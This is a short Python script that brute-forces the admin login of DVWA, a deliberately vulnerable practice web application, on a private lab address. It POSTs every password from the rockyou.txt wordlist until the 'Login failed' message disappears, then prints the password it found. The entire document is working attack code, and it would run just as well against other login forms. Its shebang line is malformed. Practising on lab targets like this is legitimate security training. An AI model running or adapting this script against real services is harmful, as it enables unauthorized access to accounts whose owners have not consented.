#!usr/bin/env python
import requests

url = "http://192.168.164.130/dvwa/login.php"
data_dict = {"username":"admin","password":"","Login":"submit"}

with open("../../../usr/share/wordlists/rockyou.txt", "r") as wordlists_file:
    for line in wordlists_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(url=url,data=data_dict)
        if "Login failed" not in response.content.decode():
            print(f"[+] Got a password --> {word}")
            exit()

print("[+] End of file reached")